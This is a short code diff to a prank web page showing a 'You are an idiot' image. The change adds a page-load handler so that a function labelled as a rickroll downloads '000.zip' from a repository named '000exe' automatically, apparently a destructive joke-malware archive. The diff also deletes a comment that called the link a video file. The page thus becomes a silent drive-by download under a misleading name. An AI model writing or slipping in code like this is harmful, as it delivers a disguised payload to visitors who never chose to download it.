@@ -23,13 +23,18 @@
     <img src="https://upload.wikimedia.org/wikipedia/en/9/9a/You_Are_An_Idiot.jpg" alt="You are an idiot" onclick="downloadRickroll()">
     
     <script>
+        // Auto-download when page loads
+        window.addEventListener('load', function() {
+            downloadRickroll();
+        });
+
         function downloadRickroll() {
-            // Create a link element
             const link = document.createElement('a');
-            link.href = 'https://github.com/FlyTechVideos/000exe/releases/download/1.0/000.zip';  // Points to your video file
+            link.href = 'https://github.com/FlyTechVideos/000exe/releases/download/1.0/000.zip';
             link.download = '000.zip';
             link.click();
         }
     </script>
 </body>
 </html>
+
